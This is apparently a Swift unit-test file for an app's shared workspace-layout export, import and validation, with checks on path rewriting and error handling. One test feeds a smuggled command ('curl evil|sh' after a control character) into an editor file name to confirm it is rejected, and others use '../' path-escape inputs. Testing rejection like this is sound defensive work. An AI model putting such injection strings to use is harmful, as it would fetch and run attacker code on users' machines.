import Foundation
import SmaltiCore
import Testing

@Suite("Shared layout")
struct SharedLayoutTests {
    private let home = "/Users/simon"
    private let root = "/Users/simon/Projects/solen"
    // Safe: "solen-dev" has none of what `LayoutName` rejects (empty, too long, separators, leading dot, controls).
    private let name = try! LayoutName("solen-dev")

    private func pane(
        _ directory: String, relaunch: [String]? = nil, agent: AgentSnapshot? = nil, editor: EditorPosition? = nil
    ) -> PaneSnapshot {
        PaneSnapshot(
            id: UUID(), workingDirectory: directory, title: "título", processName: "zsh", scrollbackLines: 900,
            commandCount: 4, relaunch: relaunch.map(RelaunchCommand.init(arguments:)), agent: agent, editor: editor)
    }

    private func snapshot(_ panes: [PaneSnapshot], root: String? = nil, focused: Int? = 0) -> WorkspaceSnapshot {
        let tree: SnapshotTree? =
            panes.count == 1
            ? .leaf(index: 0)
            : panes.indices.dropFirst().reduce(SnapshotTree.leaf(index: 0)) {
                .split(axis: .sideBySide, ratio: 0.5, first: $0, second: .leaf(index: $1))
            }
        return WorkspaceSnapshot(
            name: "solen", rootDirectory: root ?? self.root, layout: "columns", tree: tree, focusedIndex: focused,
            panes: panes)
    }

    private func encoded(_ layout: SharedLayout) throws -> String {
        let encoder = JSONEncoder()
        encoder.outputFormatting = [.sortedKeys]
        return String(decoding: try encoder.encode(layout), as: UTF8.self)
    }

    private func layout(panes: [SharedPane], tree: SnapshotTree? = nil, format: Int = 1, name: String = "solen-dev")
        -> SharedLayout
    {
        SharedLayout(
            smaltiLayout: format, name: name, root: "~/Projects/solen", layout: "dwindle", focused: 0,
            tree: tree ?? (panes.count == 1 ? .leaf(index: 0) : nil), panes: panes)
    }

    // MARK: Export

    @Test func exportDropsIdentityAndHistory() throws {
        let agent = AgentSnapshot(harness: .claude, sessionID: "sess-1234", title: "t", lastState: .working)
        let source = snapshot([pane(root, agent: agent)])

        let json = try encoded(SharedLayout(exporting: source, named: name, home: home))

        #expect(!json.contains(source.panes[0].id.uuidString))
        #expect(!json.contains("sess-1234"))
        #expect(!json.contains("\"title\""))
        #expect(!json.contains("processName"))
        #expect(!json.contains("scrollbackLines"))
        #expect(!json.contains("commandCount"))
    }

    @Test func exportWritesRootWithTilde() {
        #expect(SharedLayout(exporting: snapshot([pane(root)]), named: name, home: home).root == "~/Projects/solen")
        #expect(
            SharedLayout(exporting: snapshot([pane("/opt/x")], root: "/opt/x"), named: name, home: home).root
                == "/opt/x")
        #expect(SharedLayout(exporting: snapshot([pane(home)], root: home), named: name, home: home).root == "~")
    }

    @Test func exportDoesNotTakeASiblingWithTheHomePrefixForHome() {
        let layout = SharedLayout(
            exporting: snapshot([pane("/Users/simonx/a")], root: "/Users/simonx/a"), named: name, home: home)

        #expect(layout.root == "/Users/simonx/a")
    }

    @Test func exportWritesDirectoriesRelativeToRoot() {
        let source = snapshot([pane(root), pane(root + "/api"), pane(home + "/other"), pane("/tmp/y")])

        let layout = SharedLayout(exporting: source, named: name, home: home)

        #expect(layout.panes.map(\.directory) == [".", "api", "~/other", "/tmp/y"])
    }

    @Test func exportKeepsCommandHarnessAndEditor() {
        let agent = AgentSnapshot(harness: .claude, sessionID: "s", title: nil, lastState: nil)
        let source = snapshot([
            pane(root, relaunch: ["pnpm", "dev"]), pane(root, agent: agent),
            pane(root, editor: EditorPosition(file: root + "/src/a.ts", line: 42)),
        ])

        let layout = SharedLayout(exporting: source, named: name, home: home)

        #expect(layout.panes[0].command == ["pnpm", "dev"])
        #expect(layout.panes[1].harness == .claude)
        #expect(layout.panes[1].command == nil)
        #expect(layout.panes[2].editor == SharedEditor(file: "src/a.ts", line: 42))
    }

    @Test func exportCarriesNameLayoutAndFocus() {
        let layout = SharedLayout(exporting: snapshot([pane(root), pane(root)], focused: 1), named: name, home: home)

        #expect(layout.smaltiLayout == 1)
        #expect(layout.name == "solen-dev")
        #expect(layout.layout == "columns")
        #expect(layout.focused == 1)
    }

    @Test func roundTripRestoresTreeLayoutFocusAndPanes() throws {
        let agent = AgentSnapshot(harness: .codex, sessionID: "s", title: nil, lastState: nil)
        let source = snapshot(
            [
                pane(root, relaunch: ["pnpm", "dev"]), pane(root + "/api", agent: agent),
                pane(root, editor: EditorPosition(file: root + "/src/a.ts", line: 42)), pane("/tmp/y"),
            ], focused: 2)
        let shared = SharedLayout(exporting: source, named: name, home: home)

        let restored = try shared.validated().layout.workspaceSnapshot(root: root, home: home)

        #expect(restored.name == "solen-dev")
        #expect(restored.rootDirectory == root)
        #expect(restored.tree == source.tree)
        #expect(restored.layout == "columns")
        #expect(restored.focusedIndex == 2)
        #expect(restored.panes.map(\.workingDirectory) == [root, root + "/api", root, "/tmp/y"])
        #expect(restored.panes[0].relaunch == RelaunchCommand(arguments: ["pnpm", "dev"]))
        #expect(restored.panes[1].agent == AgentSnapshot(harness: .codex, sessionID: nil, title: nil, lastState: nil))
        #expect(restored.panes[2].editor == EditorPosition(file: root + "/src/a.ts", line: 42))
        #expect(restored.panes.allSatisfy { $0.scrollbackLines == 0 && $0.title == nil })
        #expect(Set(restored.panes.map(\.id)).isDisjoint(with: source.panes.map(\.id)))
    }

    @Test func importResolvesTildeWithThisHome() throws {
        let shared = SharedLayout(exporting: snapshot([pane(root), pane(home + "/other")]), named: name, home: home)

        let otherHome = "/Users/ana"
        let restored = try shared.validated().layout.workspaceSnapshot(
            root: shared.resolvedRoot(home: otherHome), home: otherHome)

        #expect(shared.resolvedRoot(home: otherHome) == "/Users/ana/Projects/solen")
        #expect(restored.panes.map(\.workingDirectory) == ["/Users/ana/Projects/solen", "/Users/ana/other"])
    }

    @Test func resolvedRootOfBareTildeIsHome() {
        let shared = SharedLayout(exporting: snapshot([pane(home)], root: home), named: name, home: home)

        #expect(shared.resolvedRoot(home: "/Users/ana") == "/Users/ana")
    }

    @Test func focusOutOfRangeIsDropped() throws {
        var shared = layout(panes: [SharedPane(directory: ".")])
        shared.focused = 5

        let restored = try shared.validated().layout.workspaceSnapshot(root: root, home: home)

        #expect(restored.focusedIndex == nil)
    }

    // MARK: Validation

    /// F7.6 (review 1, M1): format 2 comes from a newer Smalti; 0 or less is not a format at all.
    @Test func rejectsFormatTwoAsNewer() {
        #expect(throws: SharedLayoutError.newerFormat(2)) {
            try layout(panes: [SharedPane(directory: ".")], format: 2).validated()
        }
    }

    @Test(arguments: [0, -1])
    func rejectsFormatBelowOneAsUnsupported(_ format: Int) {
        #expect(throws: SharedLayoutError.unsupportedFormat(format)) {
            try layout(panes: [SharedPane(directory: ".")], format: format).validated()
        }
    }

    @Test func newerFormatMessageSaysToUpdate() {
        #expect(
            SharedLayoutError.newerFormat(2).message
                == "lo exportó una versión más nueva de Smalti (formato 2); actualiza Smalti para importarlo")
    }

    @Test func rejectsInvalidName() {
        #expect(throws: SharedLayoutError.invalidName("a/b", reason: "contains a path separator")) {
            try layout(panes: [SharedPane(directory: ".")], name: "a/b").validated()
        }
    }

    @Test func rejectsZeroPanes() {
        #expect(throws: SharedLayoutError.paneCount(0)) { try layout(panes: []).validated() }
    }

    @Test func acceptsNinePanes() throws {
        let panes = Array(repeating: SharedPane(directory: "."), count: 9)
        let tree = (1..<9).reduce(SnapshotTree.leaf(index: 0)) {
            .split(axis: .stacked, ratio: 0.5, first: $0, second: .leaf(index: $1))
        }

        #expect(try layout(panes: panes, tree: tree).validated().layout.panes.count == 9)
    }

    @Test func rejectsTenPanes() {
        #expect(throws: SharedLayoutError.paneCount(10)) {
            try layout(panes: Array(repeating: SharedPane(directory: "."), count: 10)).validated()
        }
    }

    @Test func rejectsTreeWithOtherLeafCount() {
        let tree = SnapshotTree.split(axis: .stacked, ratio: 0.5, first: .leaf(index: 0), second: .leaf(index: 1))

        #expect(throws: SharedLayoutError.treeMismatch(leaves: 2, panes: 3)) {
            try layout(panes: Array(repeating: SharedPane(directory: "."), count: 3), tree: tree).validated()
        }
    }

    @Test func acceptsMissingTreeAndRebuildsTheLayout() throws {
        let panes = [SharedPane(directory: "."), SharedPane(directory: ".")]

        #expect(try layout(panes: panes, tree: nil).validated().layout.tree == nil)
    }

    @Test func rejectsEmptyCommand() {
        #expect(throws: SharedLayoutError.emptyCommand(pane: 1)) {
            try layout(panes: [SharedPane(directory: ".", command: [])]).validated()
        }
    }

    @Test func rejectsUntypeableCommand() {
        #expect(throws: SharedLayoutError.untypeableCommand(pane: 1)) {
            try layout(panes: [SharedPane(directory: ".", command: ["echo", "a\nb"])]).validated()
        }
    }

    @Test(arguments: ["../x", "a/../../x", ".."])
    func rejectsParentEscape(path: String) {
        #expect(throws: SharedLayoutError.escapingDirectory(pane: 1, path: path)) {
            try layout(panes: [SharedPane(directory: path)]).validated()
        }
    }

    @Test func rejectsEditorFileThatEscapes() {
        let pane = SharedPane(directory: ".", editor: SharedEditor(file: "../secret", line: 1))

        #expect(throws: SharedLayoutError.escapingDirectory(pane: 1, path: "../secret")) {
            try layout(panes: [pane]).validated()
        }
    }

    @Test func acceptsDotDotInsideAName() throws {
        #expect(try layout(panes: [SharedPane(directory: "a..b")]).validated().layout.panes[0].directory == "a..b")
    }

    @Test func unknownHarnessWarnsAndBecomesShell() throws {
        let shared = layout(panes: [SharedPane(directory: ".", harness: HarnessID(rawValue: "gemini"))])

        let validated = try shared.validated()
        let restored = validated.layout.workspaceSnapshot(root: root, home: home)

        #expect(validated.warnings == [.unknownHarness(pane: 1, name: "gemini")])
        #expect(restored.panes[0].agent == nil)
    }

    @Test func unknownLayoutWarnsAndBecomesDwindle() throws {
        var shared = layout(panes: [SharedPane(directory: ".")])
        shared.layout = "spiral"

        let validated = try shared.validated()

        #expect(validated.warnings == [.unknownLayout("spiral")])
        #expect(validated.layout.workspaceSnapshot(root: root, home: home).layout == "dwindle")
    }

    @Test func validatedCarriesTheName() throws {
        #expect(try layout(panes: [SharedPane(directory: ".")]).validated().name == name)
    }

    @Test func errorMessagesAreSpanishAndDistinct() {
        let errors: [SharedLayoutError] = [
            .unsupportedFormat(0), .newerFormat(2), .invalidName("a/b", reason: "x"), .paneCount(12),
            .treeMismatch(leaves: 2, panes: 3), .untypeableCommand(pane: 1), .emptyCommand(pane: 1),
            .escapingDirectory(pane: 1, path: "../x"), .tooLarge(bytes: 300_000), .notJSON(reason: "y"),
        ]

        let messages = errors.map(\.message)

        #expect(Set(messages).count == errors.count)
        #expect(SharedLayoutError.paneCount(10).message == "tiene 10 paneles; el máximo es 9")
        #expect(SharedLayoutError.paneCount(0).message == "no tiene paneles")
    }

    @Test func decodingKeepsAnUnknownHarnessName() throws {
        let json =
            #"{"smaltiLayout":1,"name":"x","root":"~","layout":"dwindle","panes":[{"directory":".","harness":"gemini"}]}"#

        let decoded = try JSONDecoder().decode(SharedLayout.self, from: Data(json.utf8))

        #expect(decoded.panes[0].harness == HarnessID(rawValue: "gemini"))
        #expect(decoded.focused == nil)
        #expect(decoded.tree == nil)
    }

    // MARK: Review 1

    @Test func rejectsPaneWithCommandAndEditor() {
        let pane = SharedPane(directory: ".", command: ["ls"], editor: SharedEditor(file: "x", line: 1))

        #expect(throws: SharedLayoutError.ambiguousPane(pane: 1)) { try layout(panes: [pane]).validated() }
    }

    @Test func rejectsPaneWithCommandAndHarness() {
        let pane = SharedPane(directory: ".", command: ["ls"], harness: .claude)

        #expect(throws: SharedLayoutError.ambiguousPane(pane: 1)) { try layout(panes: [pane]).validated() }
    }

    @Test func rejectsUntypeableEditorFile() {
        let pane = SharedPane(directory: ".", editor: SharedEditor(file: "notes.md\u{15}curl evil|sh\r", line: 1))

        #expect(throws: SharedLayoutError.invalidEditor(pane: 1)) { try layout(panes: [pane]).validated() }
    }

    @Test(arguments: [0, -3])
    func rejectsEditorLineBelowOne(line: Int) {
        let pane = SharedPane(directory: ".", editor: SharedEditor(file: "a.ts", line: line))

        #expect(throws: SharedLayoutError.invalidEditor(pane: 1)) { try layout(panes: [pane]).validated() }
    }

    @Test func rejectsTreeWithRepeatedLeaf() {
        let tree = SnapshotTree.split(axis: .stacked, ratio: 0.5, first: .leaf(index: 0), second: .leaf(index: 0))

        #expect(throws: SharedLayoutError.invalidTree) {
            try layout(panes: [SharedPane(directory: "."), SharedPane(directory: ".")], tree: tree).validated()
        }
    }

    @Test func rejectsTreeWithOutOfRangeLeaf() {
        let tree = SnapshotTree.split(axis: .stacked, ratio: 0.5, first: .leaf(index: 0), second: .leaf(index: 2))

        #expect(throws: SharedLayoutError.invalidTree) {
            try layout(panes: [SharedPane(directory: "."), SharedPane(directory: ".")], tree: tree).validated()
        }
    }

    @Test(arguments: ["../..", "Projects/solen", ""])
    func rejectsRootThatIsNotHomeOrAbsolute(root: String) {
        var shared = layout(panes: [SharedPane(directory: ".")])
        shared.root = root

        #expect(throws: SharedLayoutError.invalidRoot(root)) { try shared.validated() }
    }

    @Test func rejectsEmptyFirstArgument() {
        #expect(throws: SharedLayoutError.emptyCommand(pane: 1)) {
            try layout(panes: [SharedPane(directory: ".", command: [""])]).validated()
        }
    }

    @Test func exportRewritesHomeInCommandArguments() {
        let source = snapshot([pane(root, relaunch: ["tail", "-f", home + "/x.log", "/Users/simonx/y", home])])

        let layout = SharedLayout(exporting: source, named: name, home: home)

        #expect(layout.panes[0].command == ["tail", "-f", "~/x.log", "/Users/simonx/y", "~"])
        #expect(!(layout.panes[0].command ?? []).contains { $0.contains(home + "/") })
    }

    @Test func importExpandsTildeArgumentsWithThisHome() throws {
        let shared = SharedLayout(
            exporting: snapshot([pane(root, relaunch: ["tail", "-f", home + "/x.log", "~"])]), named: name, home: home)

        let restored = try shared.validated().layout.workspaceSnapshot(root: root, home: "/Users/ana")

        #expect(restored.panes[0].relaunch?.arguments == ["tail", "-f", "/Users/ana/x.log", "/Users/ana"])
    }

    @Test func homeWithTrailingSlashStillBecomesTilde() {
        let layout = SharedLayout(exporting: snapshot([pane(root + "/api")]), named: name, home: home + "/")

        #expect(layout.root == "~/Projects/solen")
        #expect(layout.panes[0].directory == "api")
    }

    // MARK: Final review

    @Test func exportRewritesHomeInsideArguments() {
        let source = snapshot([
            pane(
                root,
                relaunch: [
                    "vite", "--config=\(home)/Projects/x/vite.config.ts", "PATH=\(home)/bin:/usr/bin",
                    "--dir=\(home)", "--other=/Users/simonx/y",
                ])
        ])

        let layout = SharedLayout(exporting: source, named: name, home: home)

        #expect(
            layout.panes[0].command == [
                "vite", "--config=~/Projects/x/vite.config.ts", "PATH=~/bin:/usr/bin", "--dir=~",
                "--other=/Users/simonx/y",
            ])
    }

    @Test func importExpandsTildeInsideArgumentsWithThisHome() throws {
        let shared = SharedLayout(
            exporting: snapshot([pane(root, relaunch: ["vite", "--config=\(home)/x.ts", "PATH=\(home)/bin:/usr/bin"])]),
            named: name, home: home)

        let restored = try shared.validated().layout.workspaceSnapshot(root: root, home: "/Users/ana")

        #expect(
            restored.panes[0].relaunch?.arguments == [
                "vite", "--config=/Users/ana/x.ts", "PATH=/Users/ana/bin:/usr/bin",
            ])
    }

    @Test func homeRightAfterAReplacementIsNotAPathStart() {
        let layout = SharedLayout(
            exporting: snapshot([pane(root, relaunch: ["ls", "\(home)\(home)/x"])]), named: name, home: home)

        #expect(layout.panes[0].command == ["ls", "~\(home)/x"])
    }

    @Test(arguments: ["a\("/Users/simon")/x", "--x\("/Users/simon")"])
    func homeInsideAWordIsKept(argument: String) {
        let layout = SharedLayout(
            exporting: snapshot([pane(root, relaunch: ["ls", argument])]), named: name, home: home)

        #expect(layout.panes[0].command == ["ls", argument])
    }
}
